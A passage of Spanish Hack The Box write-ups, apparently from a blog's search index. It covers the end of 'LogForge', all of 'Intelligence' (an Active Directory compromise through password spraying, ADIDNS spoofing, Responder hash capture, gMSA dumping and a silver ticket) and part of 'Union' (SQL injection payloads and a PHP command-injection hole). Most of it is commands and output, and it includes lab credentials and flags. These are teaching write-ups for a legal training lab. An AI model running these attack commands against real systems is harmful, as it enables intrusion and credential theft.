ftpServer-1.0-SNAPSHOT-all.jar .bashrc .selected_editor run.sh .lesshst .bash_history root.txt .viminfo .cache 226 Transfer complete. En este punto, podemos descargar la flag root.txt:\nftp\u0026gt; get root.txt local: root.txt remote: root.txt 200 Command OK 150 Opening ASCII mode data connection for requested file root.txt WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 File transfer successful. Closing data connection. 33 bytes received in 0.00 secs (210.6311 kB/s) ftp\u0026gt; quit 221 Closing connection tomcat@LogForge:/tmp$ cat root.txt 648bf4d58f9cec00f1720aeb122a4ce0 Para conseguir una sesión interactiva como root, se podría añadir una clave SSH al directorio /root/.ssh. Sin embargo, el servidor FTP de Java no funciona correctamente y no permite sobrescribir archivos. Además, la clave id_rsa que hay en el directorio /root/.ssh no funciona como uno esperaría, ya que no permite acceder sin contraseña.\n","image":"/images/HTB/LogForge/LogForge.png","permalink":"https://7rocky.github.io/htb/logforge/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina utiliza Log4j en un servidor Tomcat que es vulnerable a búsqueda JNDI. Luego hay un servidor FTP hecho en Java que también utiliza Log4j, pero esta vez solamente es vulnerable a exposición de información. Para comprometer esta máquina se necesitan conocimientos sobre Log4j, Tomcat, FTP y Wireshark","time":7,"title":"LogForge"},{"contents":"  SO: Windows   Dificultad: Media   Dirección IP: 10.10.10.248   Fecha: 03 / 07 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.248 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49229,49667,49691,49692,49704,49713 Nmap scan report for 10.10.10.248 Host is up (0.36s latency).  PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: ) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-11-16T17:38:25+00:00; +7h15m32s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-11-16T17:38:24+00:00; +7h15m31s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49229/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49691/tcp open msrpc Microsoft Windows RPC 49692/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49704/tcp open msrpc Microsoft Windows RPC 49713/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-time: | date: |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 7h15m31s, deviation: 0s, median: 7h15m30s  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 103.53 seconds La máquina tiene abiertos los puertos 53 (DNS), 80 (HTTP), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP), 445 (SMB) y 5985 (WinRM), entre otros.\n$ crackmapexec smb 10.10.10.248 SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) Además, vemos que la máquina es un controlador de dominio (DC) de un entorno de Active Directory (AD). Podemos empezar añadiendo intelligence.htb en /etc/hosts.\nEnumeración web Si entramos en http://10.10.10.248, veremos una página web como la siguiente:\nBajando un poco, podremos descargar dos documentos PDF con dos enlaces:\nTambién podemos copiar los enlaces y utilizar wget desde la consola de comandos:\n$ wget http://10.10.10.248/documents/2020-01-01-upload.pdf $ wget http://10.10.10.248/documents/2020-12-15-upload.pdf Encontrando nombres de usuario en metadatos de archivos Teniendo en cuenta que estamos intentando comprometer un entorno de Active Directory, necesitamos buscar nombres de usuario y credenciales (a lo mejor hashes NTLM o tickets de Kerberos).\nEl contenido de los documentos PDF es un simple texto Lorem ipsum, nada relevante.\nSin embargo, estos archivo PDF tienen metadatos. Entre estos metadatos, podemos encontrar dos nombres de usuario. Para extraer los metadatos podemos utilizar exiftool:\n$ exiftool *.pdf ======== 2020-01-01-upload.pdf ExifTool Version Number : 12.30 File Name : 2020-01-01-upload.pdf Directory : . File Size : 26 KiB File Modification Date/Time : 2021:04:01 19:00:00+02:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 1 Creator : William.Lee ======== 2020-12-15-upload.pdf ExifTool Version Number : 12.30 File Name : 2020-12-15-upload.pdf Directory : . File Size : 27 KiB File Modification Date/Time : 2021:04:01 19:00:00+02:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 1 Creator : Jose.Williams Y ahora tenemos dos nombres de usuario potenciales. Veamos si alguno de ellos es \u0026ldquo;AS-REP Roasteable\u0026rdquo;:\n$ GetNPUsers.py -usersfile users.txt -dc-ip 10.10.10.248 -no-pass intelligence.htb/ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [-] User William.Lee doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Jose.Williams doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Y vemos que no lo son. Veamos si por lo menos son usuarios válidos a nivel de dominio con kerbrute:\n$ ./kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt \u0026gt; Using KDC(s): \u0026gt; dc.intelligence.htb:88 \u0026gt; [+] VALID USERNAME: William.Lee@intelligence.htb \u0026gt; [+] VALID USERNAME: Jose.Williams@intelligence.htb \u0026gt; Done! Tested 2 usernames (2 valid) in 0.123 seconds Y sí lo son, pero hemos llegado a un callejón sin salida.\nEncontrando más archivos y nombres de usuario Mirando el nombre de los archivos (2020-01-01-upload.pdf y 2020-12-15-upload.pdf), podemos deducir que a lo mejor existen más archivos almacenados en el servidor con el mismo formato (es decir, YYYY-MM-DD-upload.pdf).\nPara probar todas las posibilidades en el año 2020 se puede programar un script en Go llamado reqPdf.go, que realizará todas las peticiones y descargará los archivos encontrados en menos de un segundo (explicación detallada aquí):\n$ go run reqPdf.go Fuzzing PDF files of the form: YYYY-MM-DD-upload.pdf Found 84 files in 784.6615ms Como se puede ver, se han descargado 84 archivos (realmente, solo 82 son archivos nuevos). Ahora, podemos extraer los metadatos con exiftool al igual que antes. Esta vez, podemos utilizar un poco de shell scripting para filtrar los nombres de usuario y almacenarlos en un archivo evitando repeticiones:\n$ exiftool *.pdf | grep Creator | awk \u0026#39;{ print $3 }\u0026#39; | sort -u | tee users.txt Anita.Roberts Brian.Baker Brian.Morris Daniel.Shelton Danny.Matthews Darryl.Harris David.Mcbride David.Reed David.Wilson Ian.Duncan Jason.Patterson Jason.Wright Jennifer.Thomas Jessica.Moody John.Coleman Jose.Williams Kaitlyn.Zimmerman Kelly.Long Nicole.Brock Richard.Williams Samuel.Richardson Scott.Scott Stephanie.Young Teresa.Williamson Thomas.Hall Thomas.Valenzuela Tiffany.Molina Travis.Evans Veronica.Patel William.Lee Veamos si los nombres de usuario son válidos:\n$ ./kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt \u0026gt; Using KDC(s): \u0026gt; dc.intelligence.htb:88 \u0026gt; [+] VALID USERNAME: Brian.Morris@intelligence.htb \u0026gt; [+] VALID USERNAME: Daniel.Shelton@intelligence.htb \u0026gt; [+] VALID USERNAME: David.Mcbride@intelligence.htb \u0026gt; [+] VALID USERNAME: Ian.Duncan@intelligence.htb \u0026gt; [+] VALID USERNAME: Darryl.Harris@intelligence.htb \u0026gt; [+] VALID USERNAME: Anita.Roberts@intelligence.htb \u0026gt; [+] VALID USERNAME: David.Wilson@intelligence.htb \u0026gt; [+] VALID USERNAME: David.Reed@intelligence.htb \u0026gt; [+] VALID USERNAME: Brian.Baker@intelligence.htb \u0026gt; [+] VALID USERNAME: Danny.Matthews@intelligence.htb \u0026gt; [+] VALID USERNAME: Jason.Patterson@intelligence.htb \u0026gt; [+] VALID USERNAME: John.Coleman@intelligence.htb \u0026gt; [+] VALID USERNAME: Jessica.Moody@intelligence.htb \u0026gt; [+] VALID USERNAME: Jennifer.Thomas@intelligence.htb \u0026gt; [+] VALID USERNAME: Jason.Wright@intelligence.htb \u0026gt; [+] VALID USERNAME: Jose.Williams@intelligence.htb \u0026gt; [+] VALID USERNAME: Nicole.Brock@intelligence.htb \u0026gt; [+] VALID USERNAME: Richard.Williams@intelligence.htb \u0026gt; [+] VALID USERNAME: Kaitlyn.Zimmerman@intelligence.htb \u0026gt; [+] VALID USERNAME: Kelly.Long@intelligence.htb \u0026gt; [+] VALID USERNAME: Thomas.Hall@intelligence.htb \u0026gt; [+] VALID USERNAME: Stephanie.Young@intelligence.htb \u0026gt; [+] VALID USERNAME: Scott.Scott@intelligence.htb \u0026gt; [+] VALID USERNAME: Samuel.Richardson@intelligence.htb \u0026gt; [+] VALID USERNAME: Teresa.Williamson@intelligence.htb \u0026gt; [+] VALID USERNAME: Thomas.Valenzuela@intelligence.htb \u0026gt; [+] VALID USERNAME: Travis.Evans@intelligence.htb \u0026gt; [+] VALID USERNAME: Tiffany.Molina@intelligence.htb \u0026gt; [+] VALID USERNAME: William.Lee@intelligence.htb \u0026gt; [+] VALID USERNAME: Veronica.Patel@intelligence.htb \u0026gt; Done! Tested 30 usernames (30 valid) in 0.355 seconds Y lo son. Podemos comprobar si alguno de ellos es \u0026ldquo;AS-REP Roasteable\u0026rdquo;, pero ninguno de ellos lo es. Hemos llegado a otro punto muerto.\nObtención de credenciales válidas Ahora, podemos revisar el contenido de los documentos PDF. A lo mejor hay alguno que no contiene un Lorem ipsum.\nY así es, el archivo 2020-06-04.pdf contiene la siguiente información:\nNew Account Guide  Welcome to Intelligence Corp! Please login using your username and the default password of: NewIntelligenceCorpUser9876  After logging in please change your password as soon as possible. Y también el archivo 2020-12-30.pdf es interesante:\nInternal IT Update  There has recently been some outages on our web servers. Ted has gotten a script in place to help notify us if this happens again. Also, after discussion following our recent security audit we are in the process of locking down our service accounts. El primer documento dice que todos los nuevos usuarios tendrán la misma contraseña para iniciar sesión la primera vez. Esta contraseña se debe cambiar inmediatamente. No obstante, es probable que alguno de los usuarios se haya olvidado de cambiar la contraseña.\nEsta es una situación clara para efectuar un ataque de password spray. Utilizando otra vez kerbrute obtenemos:\n$ ./kerbrute passwordspray --dc dc.intelligence.htb -d intelligence.htb users.txt NewIntelligenceCorpUser9876 \u0026gt; Using KDC(s): \u0026gt; dc.intelligence.htb:88 \u0026gt; [+] VALID LOGIN WITH ERROR: Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876 (Clock skew is too great) \u0026gt; Done! Tested 30 logins (1 successes) in 0.710 seconds El usuario llamado Tiffany.Molina tiene la contraseña por defecto. Utilizando crackmapexec podemos verificar que las credenciales son válidas:\n$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 Enumeración por SMB Ahora, podemos enumerar los recursos compartidos por SMB utilizando las credenciales encontradas:\n$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 SMB 10.10.10.248 445 DC [+] Enumerated shares SMB 10.10.10.248 445 DC Share Permissions Remark SMB 10.10.10.248 445 DC ----- ----------- ------ SMB 10.10.10.248 445 DC ADMIN$ Remote Admin SMB 10.10.10.248 445 DC C$ Default share SMB 10.10.10.248 445 DC IPC$ READ Remote IPC SMB 10.10.10.248 445 DC IT READ SMB 10.10.10.248 445 DC NETLOGON READ Logon server share SMB 10.10.10.248 445 DC SYSVOL READ Logon server share SMB 10.10.10.248 445 DC Users READ El usuario Tiffany.Molina tiene permisos de lectura sobre los recursos IT y Users. Dentro de Users podemos encontrar las siguientes carpetas:\n$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r Users [+] IP: 10.10.10.248:445 Name: intelligence.htb Status: Authenticated  Disk Permissions Comment  ---- ----------- -------  Users READ ONLY  .\\Users\\\\*  dw--w--w-- 0 Mon Apr 19 03:20:26 2021 .  dw--w--w-- 0 Mon Apr 19 03:20:26 2021 ..  dr--r--r-- 0 Mon Apr 19 02:18:39 2021 Administrator  dr--r--r-- 0 Mon Apr 19 05:16:30 2021 All Users  dw--w--w-- 0 Mon Apr 19 04:17:40 2021 Default  dr--r--r-- 0 Mon Apr 19 05:16:30 2021 Default User  fr--r--r-- 174 Mon Apr 19 05:15:17 2021 desktop.ini  dw--w--w-- 0 Mon Apr 19 02:18:39 2021 Public  dr--r--r-- 0 Mon Apr 19 03:20:26 2021 Ted.Graves  dr--r--r-- 0 Mon Apr 19 02:51:46 2021 Tiffany.Molina Y aquí poremos ver la flag user.txt:\n$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 --download \u0026#39;Users\\Tiffany.Molina\\Desktop\\user.txt\u0026#39; [+] Starting download: Users\\Tiffany.Molina\\Desktop\\user.txt (34 bytes) [+] File output to: 10.10.10.248-Users_Tiffany.Molina_Desktop_user.txt $ mv *user.txt user.txt $ cat user.txt d97eb9e4c5535fa637062d14b4b5e8c1 Movimiento lateral Mirando en el recurso IT, podemos ver un script en Powershell:\n$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r IT [+] IP: 10.10.10.248:445 Name: intelligence.htb Status: Authenticated  Disk Permissions Comment  ---- ----------- -------  IT READ ONLY  .\\IT\\\\*  dr--r--r-- 0 Mon Apr 19 02:50:58 2021 .  dr--r--r-- 0 Mon Apr 19 02:50:58 2021 ..  fr--r--r-- 1046 Mon Apr 19 02:50:58 2021 downdetector.ps1 $ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 --download \u0026#39;IT\\downdetector.ps1\u0026#39; [+] Starting download: IT\\downdetector.ps1 (1046 bytes) [+] File output to: /Users/rocky/RockyHack/HackTheBox/Machines/Intelligence/content/smb/10.10.10.248-IT_downdetector.ps1 $ mv *.ps1 downdetector.ps1 Este script es el siguiente:\n# Check web server status. Scheduled to run every 5 min Import-Module ActiveDirectory foreach ($record in Get-ChildItem \u0026#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\u0026#34; | Where-Object Name -like \u0026#34;web*\u0026#34;) {  try {  $request = Invoke-WebRequest -Uri \u0026#34;http://$($record.Name)\u0026#34; -UseDefaultCredentials  if (.StatusCode -ne 200) {  Send-MailMessage -From \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -To \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -Subject \u0026#34;Host: $($record.Name)is down\u0026#34;  }  } catch { } } Básicamente, lo que hace el script es buscar en LDAP subdominios del tipo web*.intelligence.htb y realizar una petición web con las credenciales de Ted.Graves (cada 5 minutos). Recordemos que uno de los documentos PDF hablaba de este script.\nEsta vez, podemos añadir un subdominio llamado webrocky.intelligence.htb al DNS utilizando las credenciales de Tiffany.Molina para que apunte a nuestra dirección IP de atacante (esto se conoce como ADIDNS Spoofing, más información aquí):\n$ python3 dnstool.py -u \u0026#39;intelligence.htb\\Tiffany.Molina\u0026#39; -p NewIntelligenceCorpUser9876 -a add -t A -d 10.10.17.44 -r webrocky.intelligence.htb 10.10.10.248 [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Adding new record [+] LDAP operation completed successfully Después, podemos envenenar la red con responder para obtener el hash NTLMv2 de Ted.Graves (después de unos 5 minutos):\n# responder -I tun0 -wrf [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:babffe540ac1b831:0364CAF23EA2F62B341D14C3F4549FFE:0101000000000000B781A55282DBD701F1D34C24313F979000000000020008004C004E004B00390001001E00570049004E002D00470059005A0039005700450041003800580054004600040014004C004E004B0039002E004C004F00430041004C0003003400570049004E002D00470059005A00390057004500410038005800540046002E004C004E004B0039002E004C004F00430041004C00050014004C004E004B0039002E004C004F00430041004C0008003000300000000000000000000000002000004ED462F79CC6312548361C6AE96725DCCB9550B7169C99A9C3663CDF8F50C6F80A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D0072006F0063006B0079002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 Ahora que tenemos el hash, podemos tratar de romperlo con john:\n$ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Mr.Teddy (Ted.Graves) 1g 0:00:00:18 DONE 0.05288g/s 571891p/s 571891c/s 571891C/s Mr5M1rtins..Mr BOB Use the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably Session completed. Y encontramos la contraseña. Veamos si las credenciales son válidas con crackmapexec:\n$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [+] intelligence.htb\\Ted.Graves:Mr.Teddy Ataque de Silver Ticket Y aquí tenemos otro punto muerto. Para continuar enumerando el entorno de Active Directory, podemos utilizar BloodHound.\nPara ello, primero generamos los archivos JSON con la información necesaria (dominios, ordenadores, usuarios y grupos) con bloodhound-python:\n$ bloodhound-python -c all -u Ted.Graves -p Mr.Teddy -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 --dns-timeout 60 -w 1 INFO: Found AD domain: intelligence.htb INFO: Connecting to LDAP server: dc.intelligence.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 2 computers INFO: Connecting to LDAP server: dc.intelligence.htb INFO: Found 42 users INFO: Found 54 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 1 workers INFO: Querying computer: svc_int.intelligence.htb WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 61.44789505004883 seconds INFO: Querying computer: dc.intelligence.htb INFO: Done in 01M 29S A continuación, introducimos los archivos en BloodHound y buscamos información para poder obtener acceso al Controlador de Dominio (DC). Obtenemos el siguiente grafo:\nComo vemos, el usuario Ted.Graves es miembro del grupo ITSupport. Y los miembros de este grupo tienen permiso para obtener la contraseña de svc_int$, una cuenta de servicio gestionada por un grupo (gMSA).\nUtilizando gMSADumper, podemos conseguir el hash NTLM de la cuenta de este servicio:\n$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb Users or groups who can read password for svc_int$:  \u0026gt; DC$  \u0026gt; itsupport svc_int$:::b98d4cef68f72a98dfeed732d1b1abca Y obtenemos el hash NTLM de svc_int$. Ahora es el momento de efectuar un ataque de Silver Ticket.\nComo en cualquier ataque a Kerberos, en primer lugar es necesario sincronizarse con el servidor (utilizando ntpdate o rdate):\n# ntpdate 10.10.10.248 ntpdate[25547]: step time server 10.10.10.248 offset +29732.296110 sec Y ahora podemos obtener el Silver Ticket para impersonar al usuario Administrator utilizando getST.py de Impacket y especificando el hash de svc_int$:\n$ getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.10.10.248 -hashes :b98d4cef68f72a98dfeed732d1b1abca intelligence.htb/svc_int$ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator.ccache $ export KRB5CCNAME=Administrator.ccache Después de exportar la variable de entormo KRB5CCNAME, podemos utilizar prácticamente cualquier herramienta de Impacket para ganar acceso a la máquina utilizando los parámetros -k -no-pass (por ejemplo: smbclient.py, smbexec.py, wmiexec.py o psexec.py).\nUtilizando wmiexec.py podemos entrar como Administrator y capturar la flag root.txt:\n$ wmiexec.py -k -no-pass -dc-ip 10.10.10.248 intelligence.htb/Administrator@dc.intelligence.htb Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\\u0026gt;whoami intelligence\\administrator C:\\\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt f8f11214c3520eedde9fa839193356bc ","image":"/images/HTB/Intelligence/Intelligence.png","permalink":"https://7rocky.github.io/htb/intelligence/","section":"htb","summary":"Hack The Box. Windows. Máquina media. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de usuarios, envenenamiento de red un un ataque de Silver Ticket. Para comprometer la máquina se necesitan fundamentos de scripting, de DNS, de ataques en AD y de BloodHound. En este write-up se utiliza un script en Go personalizado para descargar documentos de un servidor web","time":10,"title":"Intelligence"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.128   Fecha: 22 / 11 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.128 -p 80 Nmap scan report for 10.10.11.128 Host is up (0.040s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 9.12 seconds  La máquina tiene abierto el puerto 80 (HTTP).\nEnumeración Si vamos a http://10.10.11.128 veremos una página como esta:\nPodemos tratar de introducir el nombre de un jugador y veremos que el jugador está disponible para competir en el torneo:\nEntonces, podemos pinchar en \u0026ldquo;here\u0026rdquo; e introducir una flag en la siguiente página:\nPero aún no tenemos ninguna flag válida.\nVemos que la página está creada en PHP. En este punto, podemos aplicar fuzzing mediante ffuf añadiendo extensiones PHP:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.128/FUZZ -e .php index.php [Status: 200, Size: 1220, Words: 158, Lines: 43] css [Status: 301, Size: 178, Words: 6, Lines: 8] firewall.php [Status: 200, Size: 13, Words: 2, Lines: 1] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] challenge.php [Status: 200, Size: 772, Words: 48, Lines: 21]  Acceso a la máquina Se descubren algunos archivos interesantes que serán útiles más adelante.\nEncontrando una inyección de código SQL El campo de jugador es vulnerable a inyección de código SQL de tipo Union-based (el nombre de la máquina es una pista). Para probarlo, podemos utilizar curl desde la consola de comandos:\n$ curl 10.10.11.128/index.php -d 'player=asdf' Congratulations asdf you may compete in this tournament!\nComplete the challenge \u0026lt;a href=\"/challenge.php\"\u0026gt;here\u0026lt;/a\u0026gt; $ curl 10.10.11.128/index.php -d \"player=asdf'\" Congratulations asdf' you may compete in this tournament!\nComplete the challenge \u0026lt;a href=\"/challenge.php\"\u0026gt;here\u0026lt;/a\u0026gt; $ curl 10.10.11.128/index.php -d \"player=asdf'-- -\" Congratulations asdf'-- - you may compete in this tournament!\nComplete the challenge \u0026lt;a href=\"/challenge.php\"\u0026gt;here\u0026lt;/a\u0026gt;  A primera vista no parece vulnerable. Podemos probar a inyectar una sentencia UNION SELECT y entonces veremos un resultado distinto:\n$ curl 10.10.11.128/index.php -d \"player=' union select database() -- -\" Sorry, november you are not eligible due to already qualifying. $ curl 10.10.11.128/index.php -d \"player=' union select version() -- -\" Sorry, 8.0.27-0ubuntu0.20.04.1 you are not eligible due to already qualifying. $ curl 10.10.11.128/index.php -d \"player=' union select user() -- -\" Sorry, uhc@localhost you are not eligible due to already qualifying.  En este punto, podemos crear un programa para facilitar la extracción de datos mediante inyección SQL. Esta vez, he utilizado un programa en Java llamado UnionSQLi.java que genera una sesión interactiva para introducir consultas SQL y muestra el resultado de la consulta (explicación detallada aquí).\nCapturando la flag Con este programa, podemos capturar fácilmente la flag que necesitamos:\n$ rlwrap java UnionSQLi.java SQLi\u0026gt; select database() november SQLi\u0026gt; select group_concat(table_name) from information_schema.tables where table_schema = 'november' flag,players SQLi\u0026gt; select group_concat(column_name) from information_schema.columns where table_name = 'flag' one SQLi\u0026gt; select one from flag UHC{F1rst_5tep_2_Qualify}  Al introducir la flag en la página web, se obtiene la siguiente respuesta:\nAhora, el puerto 22 (SSH) está habilitado para nuestra dirección IP:\n$ nmap 10.10.11.128 -p 22 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 10.10.11.128 Host is up (0.051s latency). PORT STATE SERVICE 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds  Accediendo por SSH Sin embargo, no sabemos ni el usuario ni la contraseña para entrar por SSH.\nUtilizando SQLi, podemos tratar de leer archivos del servidor. Veamos si podemos encontrar credenciales en texto claro en config.php:\n$ rlwrap java UnionSQLi.java SQLi\u0026gt; select load_file('/var/www/html/config.php')  \u0026lt;?php session_start(); $servername =\"127.0.0.1\"; $username =\"uhc\"; $password =\"uhc-11qual-global-pw\"; $dbname =\"november\"; $conn =newmysqli($servername, $username, $password, $dbname); ?\u0026gt;  Y ahora que tenemos unas credenciales para MySQL, podemos reutilizarlas para SSH, y en este caso funcionan:\n$ ssh uhc@10.10.11.128 uhc@10.10.11.128's password: uhc@union:~$ cat user.txt 5875c4d16efbe9165548f9a5157e61ab  Habiendo capturado la flag user.txt, podemos enumerar el sistema. No hay mucho que hacer como usuario uhc.\nMovimiento lateral al usuario www-data Podemos continuar leyendo el código fuente mediante SQLi, o bien desde la sesión de SSH.\nEncontrando una inyección de comandos Mirando en el archivo firewall.php, podemos verificar cómo se aplica la regla de iptables para habilitar SSH para una dirección IP determinada:\nuhc@union:~$ cd /var/www/html uhc@union:/var/www/html$ cat firewall.php  \u0026lt;?php require('config.php'); if(!($_SESSION['Authenticated'])) { echo\"Access Denied\"; exit; } ?\u0026gt; \u0026lt;linkhref=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\"rel=\"stylesheet\"id=\"bootstrap-css\"\u0026gt; \u0026lt;scriptsrc=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;scriptsrc=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!------ Include the above in your HEAD tag ----------\u0026gt; \u0026lt;divclass=\"container\"\u0026gt; \u0026lt;h1class=\"text-center m-5\"\u0026gt;Join the UHC - November Qualifiers\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;sectionclass=\"bg-dark text-center p-5 mt-4\"\u0026gt; \u0026lt;divclass=\"container p-5\"\u0026gt; \u0026lt;?php if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip =$_SERVER['HTTP_X_FORWARDED_FOR']; } else{ $ip =$_SERVER['REMOTE_ADDR']; }; system(\"sudo /usr/sbin/iptables -A INPUT -s \".$ip .\" -j ACCEPT\"); ?\u0026gt; \u0026lt;h1class=\"text-white\"\u0026gt;Welcome Back!\u0026lt;/h1\u0026gt; 